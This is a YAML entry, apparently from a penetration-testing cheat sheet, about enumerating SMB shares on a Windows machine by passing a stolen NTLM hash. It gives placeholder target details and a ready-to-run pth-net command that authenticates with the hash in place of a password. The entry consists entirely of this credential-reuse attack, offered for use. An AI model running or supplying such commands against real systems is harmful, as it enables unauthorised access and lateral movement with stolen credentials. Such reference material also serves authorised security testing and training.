---
description: Enumerate SMB shares on a remote machine using the net rpc share list command with NTLM Pass-the-Hash.

Command Reference:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  pth-net rpc share list -U 'test.local\john%00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396' -S 10.10.10.1

items:
  - Hash

services:
  - SMB
  - NTLM

OS:
  - Windows

attack_types:
  - Enumeration

references:
  - https://www.samba.org/samba/docs/current/man-html/net.8.html
  - https://github.com/byt3bl33d3r/pth-toolkit
  - https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview
---
